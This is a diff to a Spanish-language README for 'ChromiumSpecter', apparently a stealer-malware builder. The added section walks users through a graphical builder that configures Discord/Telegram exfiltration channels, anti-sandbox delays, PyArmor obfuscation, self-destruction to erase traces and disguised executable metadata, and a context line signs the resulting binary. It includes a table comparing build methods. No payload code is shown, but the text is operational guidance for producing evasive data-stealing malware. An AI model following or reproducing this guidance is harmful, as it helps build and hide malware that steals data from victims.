@@ -95,16 +95,33 @@ Firma el binario directamente desde tu terminal de Linux:
 bash autocert.sh dist/ChromiumSpecter.exe
 ```
 
+## 🎛️ Flujo C: Dashboard Builder (Recomendado)
+
+Este es el método más sencillo y potente, utilizando la interfaz gráfica integrada para configurar y generar el ejecutable.
+
+### Pasos
+
+1. **Tab de Exfiltración**: Configura y verifica tus canales (Discord/Telegram). Guarda la configuración.
+2. **Tab de Compilación (Builder)**:
+    * **Metadatos**: Define el nombre del ejecutable, empresa, versión e ícono.
+    * **Sigilo**: Configura los Delays (Anti-Sandbox) y el Timeout de Webhooks.
+    * **Opciones**: Activa **Ofuscación (PyArmor)** para máxima protección o **Autodestrucción** para borrar el rastro.
+3. **Build**: Presiona `🔨 INICIAR COMPILACIÓN`. El Dashboard usará su motor interno para generar el archivo en la carpeta `dist/`.
+
+> [!TIP]
+> El Dashboard Master lleva su propio motor de compilación inyectado. Esto permite generar stubs incluso si no tienes Python instalado en el sistema global.
+
 ---
 
 ## 🛡️ Comparativa de Flujos
 
-| Característica | Flujo A (Híbrido) | Flujo B (Wine) |
-| :--- | :--- | :--- |
-| **Estabilidad** | ⭐ Excelente | ⚠️ Moderada |
-| **Simplicidad** | ⭐ Alta | ⚠️ Baja (Configuración compleja) |
-| **Aislamiento** | ❌ Bajo | ⭐ Alto (Todo en Linux) |
-| **Tamaño de Build** | ~18 MB | ~18 MB |
+| Característica | Flujo A (Híbrido) | Flujo B (Wine) | Flujo C (Dashboard) |
+| :--- | :--- | :--- | :--- |
+| **Estabilidad** | ⭐ Excelente | ⚠️ Moderada | ⭐ Excelente |
+| **Simplicidad** | ⭐ Alta | ⚠️ Baja | 🏆 Máxima |
+| **Aislamiento** | ❌ Bajo | ⭐ Alto | 🟡 Medio |
+| **Tamaño de Build** | ~18 MB | ~18 MB | ~18 MB |
+| **Portabilidad** | Media (Repo) | Alta (Linux) | 🚀 Total (Standalone) |
 
 ---
 
